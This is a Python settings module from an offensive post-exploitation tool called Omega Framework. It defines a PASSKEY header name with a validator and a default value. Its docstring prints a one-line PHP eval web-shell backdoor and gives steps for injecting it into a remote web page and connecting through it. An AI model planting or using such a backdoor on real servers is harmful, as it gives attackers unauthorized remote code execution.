#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
HTTP Header to use as main Omega payload stager for RCE.

PASSKEY is used by backdoor setting, and Omega http
tunnel mechanisms as the main payload stager & dispatcher.

While exploiting a remote target with Omega, make sure
passkey have the same value as the one it had when BACKDOOR
had been generated.

* AUTHENTICATION FEATURE:
It is recommended that you permanently change PASSKEY value
to a custom value for authentication purposes.
Indeed, having a custom PASSKEY value ensures that other
Omega users will not be able to connect to your installed
backdoor without the knowledge of it's value.

* EXAMPLE: Use a custom PASSKEY to prevent unauthorized access
> set PASSKEY Custom123
> exploit
# [*] Current backdoor is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
# To run a remote tunnel, the backdoor shown above must be
# manually injected in a remote server executable web page.
# Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
"""
import re

import linebuf


linebuf_type = linebuf.MultiLineBuffer


def validator(value):
    value = str(value)
    reserved_headers = ['host', 'accept-encoding', 'connection',
                        'user-agent', 'content-type', 'content-length']
    if not value:
        raise ValueError("can't be an empty string")
    if not re.match("^[a-zA-Z0-9_]+$", value):
        raise ValueError("only chars from set «a-Z0-9_» are allowed")
    if re.match('^zz[a-z]{2}$', value.lower()) or \
       value.lower().replace('_', '-') in reserved_headers:
        raise ValueError("reserved header name: «{}»".format(value))
    return value


def default_value():
    raw_value = "omega"
    return raw_value
